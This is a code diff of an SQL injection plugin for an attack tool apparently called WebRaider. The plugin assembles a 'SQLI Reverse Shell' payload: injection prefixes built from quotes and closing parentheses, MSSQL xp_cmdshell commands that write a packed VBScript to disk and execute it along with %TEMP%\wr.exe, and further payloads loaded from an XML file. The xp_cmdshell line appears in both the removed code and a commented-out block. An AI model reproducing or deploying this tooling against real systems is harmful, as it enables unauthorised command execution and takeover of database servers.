@@ -1,6 +1,7 @@
 ﻿Imports System.ComponentModel.Composition
 Imports WebRaider.Plugins.Raider
 Imports WebRaider.SharedLibrary
+Imports System.Xml.Linq
 
 <Export(GetType(IRaider))> _
 Public Class SQLI
@@ -22,8 +23,9 @@ Public Class SQLI
 
         Return True
     End Function
-
+    Dim _Payloads As List(Of SQLPayload)
     Dim _AttackPatterns As List(Of AttackPattern)
+
 
     Public ReadOnly Property Attacks() As System.Collections.Generic.List(Of AttackPattern) Implements WebRaider.Plugins.Raider.IRaider.Attacks
         Get
@@ -32,25 +34,82 @@ Public Class SQLI
     End Property
 
     Public Sub Setup() Implements WebRaider.Plugins.Raider.IRaider.Setup
-        _AttackPatterns = New List(Of AttackPattern)(1)
-        _AttackPatterns.Add(New AttackPattern("SQLI Reverse Shell", GetPayload(WebRaider.SharedLibrary.Options.GroupNumber, WebRaider.SharedLibrary.Options.ParameterType.ToString)))
-    End Sub
 
-    Public Function GetPayload(Optional ByVal groupNumber As Integer = 0, Optional ByVal ParamType As String = "Integer") As String
+        _Payloads = New List(Of SQLPayload)()
 
-		Dim Payload As String = My.Computer.FileSystem.ReadAllText(My.Application.Info.DirectoryPath & "\Utilities\GenerateBinary-Generated.packed.vbs")
+        Dim doc = XDocument.Load("payloads.xml")
+        _Payloads.Clear()
+        For Each payload In doc.<xml>.<payload>
+            Dim newPayload As New SQLPayload
+            newPayload.Name = payload.@name
+            newPayload.Payload = payload.<attack>.Value
+            If Not payload.<attack>.@encoded = "true" Then
+                newPayload.IsEncoded = False
+            Else
+                newPayload.IsEncoded = True
+            End If
 
-        Dim entry As String = "1"
-        If (ParamType = "Str") Then
-            entry += "'"
-        End If
+            If payload.<attack>.@consoleencoding = "true" Then
+                newPayload.ConsoleEncoding = True
+            Else
+                newPayload.ConsoleEncoding = False
+            End If
 
-        For i = 0 To groupNumber - 1
-            entry += ")"
+            _Payloads.Add(newPayload)
+
+            If Not Options.Payloads.Contains(newPayload.Name) Then
+                Options.Payloads.Add(newPayload.Name)
+            End If
+
         Next
 
-        Payload = String.Format("{1};exec master..xp_cmdshell 'echo {0}>p.vbs && p.vbs && %TEMP%\wr.exe';--", EscapeEcho(Payload), entry.ToString)
-        Return Payload
+        _AttackPatterns = New List(Of AttackPattern)(1)
+        _AttackPatterns.Add(New AttackPattern("SQLI Reverse Shell", GetPayload(WebRaider.SharedLibrary.Options.GroupNumber, WebRaider.SharedLibrary.Options.ParameterType.ToString(), WebRaider.SharedLibrary.Options.SelectedPayload)))
+    End Sub
+
+    Public Function GetPayload(Optional ByVal groupNumber As Integer = 0, Optional ByVal ParamType As String = "Integer", Optional ByVal payloadName As String = "") As String
+
+        Dim currentPayload As String = My.Computer.FileSystem.ReadAllText(My.Application.Info.DirectoryPath & "\Utilities\GenerateBinary-Generated.packed.vbs")
+        Dim attackPayloads = From payload In _Payloads Where payload.Name = payloadName
+        Dim attackPayload = attackPayloads.ElementAt(0)
+        Dim entry As String = ""
+
+        attackPayload.Payload = attackPayload.Payload.Replace("{PAYLOAD}", "{0}")
+        If attackPayload.IsEncoded = True Then attackPayload.Payload = System.Web.HttpUtility.UrlDecode(attackPayload.Payload)
+
+        If attackPayload.Name.ToLower.Contains("mssql") Then
+            If (ParamType = "Str") Then
+                entry = "1'"
+            Else
+                entry = "1"
+            End If
+
+            For i = 0 To groupNumber - 1
+                entry += ")"
+            Next
+            entry += ";"
+        Else
+            If ParamType = "Str" Then
+                entry = "1' and "
+            Else
+                entry = "1 and "
+            End If
+        End If
+        If attackPayload.ConsoleEncoding Then
+            currentPayload = String.Format("{1}" + attackPayload.Payload, EscapeEcho(currentPayload), entry.ToString)
+        Else
+            currentPayload = String.Format("{1}" + attackPayload.Payload, currentPayload, entry.ToString)
+        End If
+
+        'Select Case Db
+        '    Case Options.Database.MSSQL
+        '        Payload = String.Format("{1};exec master..xp_cmdshell 'echo {0}>p.vbs && p.vbs && %TEMP%\wr.exe';--", EscapeEcho(Payload), entry.ToString)
+        '    Case Options.Database.ORACLE
+        '        Payload = String.Format("{1};exec master..xp_cmdshell 'echo {0}>p.vbs && p.vbs && %TEMP%\wr.exe';--", EscapeEcho(Payload), entry.ToString)
+        'End Select
+
+
+        Return currentPayload
     End Function
 
 
